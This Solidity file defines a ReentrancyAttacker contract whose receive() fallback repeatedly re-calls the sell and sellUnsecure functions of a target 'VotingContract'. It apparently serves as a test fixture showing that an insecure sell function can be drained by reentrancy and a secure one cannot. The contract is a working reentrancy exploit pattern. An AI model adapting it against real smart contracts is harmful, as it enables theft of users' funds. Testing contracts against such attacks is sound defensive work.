// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.9;

interface VotingContract {
    function sellUnsecure(uint256 amount) external;

    function sell(uint256 amount) external;

    function buy(uint256 amount) external payable;
}

contract ReentrancyAttacker {
    VotingContract internal _voting;
    uint256 internal _amount;
    bool internal _isAttacked = false;
    bool internal _buyed = false;

    constructor(address voting) {
        _voting = VotingContract(voting);
    }

    receive() external payable {
        if (_buyed) {
            return;
        }

        if (!_isAttacked) {
            if (_amount < 2) {
                attackSellSecure();
            }

            return;
        }

        attackSellUnsecure();
    }

    function buy(uint256 amount) external payable {
        _buyed = true;
        _voting.buy{value: msg.value}(amount);
    }

    function attackSellUnsecure() public {
        _isAttacked = true;
        _buyed = false;
        _amount++;
        _voting.sellUnsecure(10);
    }

    function attackSellSecure() public {
        _buyed = false;
        _amount++;
        _voting.sell(10);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getAmount() external view returns (uint256) {
        return _amount;
    }
}
